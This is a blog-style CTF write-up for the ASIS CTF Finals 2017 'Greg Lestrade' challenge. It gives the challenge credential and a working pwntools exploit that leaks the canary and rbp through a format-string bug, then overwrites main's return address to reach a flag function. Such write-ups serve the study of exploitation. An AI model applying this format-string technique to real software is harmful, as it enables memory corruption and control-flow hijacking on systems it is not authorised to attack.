---
layout: post
alias: "/blog/2017/09/11/asis-ctf-finals-2017-greg-lestrade/"
date: "2017-09-11T08:09:22+09:00"
tags: [ "ctf", "writeup", "pwn", "asis-ctf" ]
---

# ASIS CTF Finals 2017: Greg Lestrade

他の問題が解けないのでプロが放置してたやるだけをやってお茶を濁した回2。

## problem

```
$ nc 146.185.132.36 12431
[*] Welcome admin login system! 

Login with your credential...
Credential : 7h15_15_v3ry_53cr37_1_7h1nk
0) exit
1) admin action
1
[*] Hello, admin 
Give me your command : 
```

## solution

Rewrite the return address of `main` with the flag function.
Use the format-string bug to read `rbp` and to rewrite it.

There is a bufferoverflow bug at reading credential, but it is not used.

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='146.185.132.36')
parser.add_argument('port', nargs='?', default=12431, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='./greg_lestrade')
args = parser.parse_args()
context.log_level = args.log_level
context.binary = args.binary
elf = ELF(args.binary)

credential = '7h15_15_v3ry_53cr37_1_7h1nk'
system_cat_flag = 0x400876
p = remote(args.host, args.port)
# p = process(args.binary)

p.sendlineafter('Credential : ', credential)

menu = '''\
0) exit
1) admin action
'''
p.sendlineafter(menu, '1')
payload = ''
payload += 'a' * 256
payload += '/%137$p/%138$p/'
p.sendlineafter('Give me your command : ', payload)
s = p.recvline()
canary = int(s.split('/')[1], 16)
rbp = int(s.split('/')[2], 16)
log.info('canary = %#x', canary)
log.info('rbp = %#x', rbp)

retaddr = rbp + 8
for i, c in enumerate(p64(system_cat_flag)):
    p.sendlineafter(menu, '1')
    payload = ''
    payload += 'a' * 256
    payload += '%' + str(ord(c) + 256) + 'c'
    payload += '%42$hhn'
    payload += ' ' * (256 + 16 - len(payload))
    payload += p64(retaddr + i)
    p.sendlineafter('Give me your command : ', payload)

p.interactive()
```
